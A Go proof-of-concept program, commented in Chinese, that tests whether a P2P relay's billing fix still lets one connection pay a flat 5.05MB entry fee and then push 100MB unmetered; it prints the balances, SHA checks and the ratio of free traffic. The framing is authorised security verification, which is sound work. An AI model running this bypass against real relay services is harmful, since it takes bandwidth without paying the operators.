// Command billingpoc 对【连接保证金修复】后的计费系统做授权穿透验证。
//
// 修复模型（BILLING_修复方案_机制层.md）：建连经 CA /reserve 对 client 扣 5MB、server 扣
// 0.05MB 定额入场费，任一方余额不足即拒连；client_to_relay 方向【按设计不计量】。
//
// 本 PoC 验证修复文档 §4 line 86 自认的【残余漏洞】是否实网可利用：
//
//	"一条长连接闷头推大流量 ⚠️ 仍以 5.05MB 封顶白嫖任意量"
//
// 打法：用调用方显式提供的授权 client/server 身份，只付一次 5.05MB 入场费，然后朝 server 方向
// (client_to_relay, 不计量) 推 100MB。若 100MB 传输 SHA 一致、而总扣费恒为 5.05MB，
// 则证明"定额入场费 + 单连接无量上限"下，计费与实际转发量严重脱节（20:1 白嫖）。
package main

import (
	"context"
	"crypto/ecdh"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"os"
	"time"

	"bnfs_p2p/admissioncli"
	"bnfs_p2p/logx"
	"bnfs_p2p/p2pnode"
	"bnfs_p2p/p2pnode/impl/natnode"
)

func main() {
	caURL := flag.String("ca", os.Getenv("BNFS_BILLING_CA_URL"), "CA 地址（也可用 BNFS_BILLING_CA_URL）")
	relay := flag.String("relay", os.Getenv("BNFS_BILLING_RELAY_ADDR"), "index/relay 地址（也可用 BNFS_BILLING_RELAY_ADDR）")
	sizeMB := flag.Int("size", 100, "传输大小(MB)")
	clientKey := flag.String("clientkey", os.Getenv("BNFS_BILLING_CLIENT_KEY"), "client 私钥 hex（也可用 BNFS_BILLING_CLIENT_KEY）")
	serverKey := flag.String("serverkey", os.Getenv("BNFS_BILLING_SERVER_KEY"), "server 私钥 hex（也可用 BNFS_BILLING_SERVER_KEY）")
	flag.Parse()
	if *caURL == "" || *relay == "" || *clientKey == "" || *serverKey == "" {
		fmt.Fprintln(os.Stderr, "必须通过参数或 BNFS_BILLING_* 环境变量提供 CA、relay 和密钥")
		os.Exit(2)
	}

	logx.SetLevel(logx.LevelInfo)
	target := int64(*sizeMB) * 1024 * 1024
	const chunk = 256 * 1024

	fmt.Printf("=== 连接保证金修复后穿透验证 (§4 残余: 定额入场费白嫖) ===\n")
	fmt.Printf("测试端点已配置，传输=%dMB\n\n", *sizeMB)

	ckey := mustKey("client", *clientKey)
	skey := mustKey("server", *serverKey)

	// ---- B: 调用方提供的授权 server 身份 ----
	nodeB, err := natnode.NewNATNode(skey, *relay)
	must("创建 B(server)", err)
	must("B 申请 server 证书", admissioncli.SetupNat(nodeB, *caURL, admissioncli.RoleServer()))
	fmt.Println("[B] server 身份已就绪")

	// ---- A: 调用方提供的授权 client 身份 ----
	nodeA, err := natnode.NewNATNode(ckey, *relay)
	must("创建 A(client)", err)
	must("A 申请 client 证书", admissioncli.SetupNat(nodeA, *caURL, admissioncli.RoleClient()))
	fmt.Println("[A] client 身份已就绪")

	cBefore := balanceOf(*caURL, string(nodeA.ID()))
	sBefore := balanceOf(*caURL, string(nodeB.ID()))
	fmt.Printf("[余额] 攻击前  client=%dB  server=%dB\n", cBefore, sBefore)

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	// B 收满 target 字节并做增量 SHA256。
	done := make(chan string, 1)
	nodeB.OnConnection(func(conn p2pnode.Connection) {
		go func() {
			h := sha256.New()
			var got int64
			for got < target {
				msg, rerr := conn.Receive(ctx)
				if rerr != nil {
					fmt.Printf("[B] 接收中断 @%dB: %v\n", got, rerr)
					done <- ""
					return
				}
				got += int64(len(msg.Payload))
				h.Write(msg.Payload)
				if got%(10*1024*1024) < chunk {
					fmt.Printf("[B] 已接收 %d MB (client_to_relay, 不计量)\n", got/1024/1024)
				}
			}
			done <- hex.EncodeToString(h.Sum(nil))
		}()
	})

	go func() {
		if e := nodeB.Listen(ctx, *relay); e != nil {
			fmt.Printf("[B] Listen 退出: %v\n", e)
		}
	}()
	go func() {
		if e := nodeA.Listen(ctx, *relay); e != nil {
			fmt.Printf("[A] Listen 退出: %v\n", e)
		}
	}()
	time.Sleep(3 * time.Second)

	fmt.Printf("\n[A] 连接 server (建连触发 CA /reserve: client 扣 5MB / server 扣 0.05MB)...\n")
	conn, err := nodeA.Connect(ctx, nodeB.ID())
	must("A 连接 B", err)
	fmt.Printf("[A] 已连接, 推送 %dMB (A→B = client_to_relay 不计量)\n\n", *sizeMB)

	payload := make([]byte, target)
	rand.New(rand.NewSource(42)).Read(payload)
	srcSHA := sha256.Sum256(payload)

	start := time.Now()
	for off := int64(0); off < target; off += chunk {
		end := off + chunk
		if end > target {
			end = target
		}
		if e := conn.Send(ctx, &p2pnode.Message{Payload: payload[off:end]}); e != nil {
			must("A 发送", e)
		}
	}
	fmt.Printf("[A] 发送完成, 耗时 %s\n", time.Since(start).Truncate(time.Millisecond))

	select {
	case dstSHA := <-done:
		cAfter := balanceOf(*caURL, string(nodeA.ID()))
		sAfter := balanceOf(*caURL, string(nodeB.ID()))
		fmt.Printf("\n=== 结果 ===\n")
		fmt.Printf("源 SHA256: %s\n收 SHA256: %s\n", hex.EncodeToString(srcSHA[:]), dstSHA)
		if dstSHA != hex.EncodeToString(srcSHA[:]) {
			fmt.Printf("SHA 校验: ❌ 不一致\n")
			os.Exit(1)
		}
		fmt.Printf("SHA 校验: ✅ 一致\n\n")
		fmt.Printf("[余额] 攻击后  client=%dB  server=%dB\n", cAfter, sAfter)
		spent := (cBefore - cAfter) + (sBefore - sAfter)
		fmt.Printf("[扣费] client -%dB, server -%dB, 合计 -%dB (=%.2fMB)\n",
			cBefore-cAfter, sBefore-sAfter, spent, float64(spent)/1024/1024)
		fmt.Printf("[比值] 传输 %dMB / 扣费 %.2fMB = %.1f:1 白嫖倍率\n",
			*sizeMB, float64(spent)/1024/1024, float64(target)/float64(max64(spent, 1)))
		fmt.Printf("\n✅ §4 残余漏洞在授权测试环境可复现: 定额入场费 %.2fMB 覆盖 %dMB 任意传输, 计费与转发量脱节。\n",
			float64(spent)/1024/1024, *sizeMB)
	case <-time.After(15 * time.Minute):
		fmt.Printf("超时\n")
		os.Exit(1)
	}
}

func mustKey(name, hexStr string) *ecdh.PrivateKey {
	k, err := natnode.LoadPrivateKeyFromHex(hexStr)
	must("加载 "+name+" 私钥", err)
	return k
}

func max64(a, b int64) int64 {
	if a > b {
		return a
	}
	return b
}

func must(what string, err error) {
	if err != nil {
		fmt.Printf("[FATAL] %s: %v\n", what, err)
		os.Exit(1)
	}
}

// balanceOf 查询 CA 账本余额（仅读，不涉及 /credit 分发余额）。
func balanceOf(caURL, nodeID string) int64 {
	resp, err := http.Get(caURL + "/balance?node=" + nodeID)
	if err != nil {
		return -1
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	var m map[string]int64
	if json.Unmarshal(body, &m) != nil {
		return -1
	}
	return m["balance"]
}
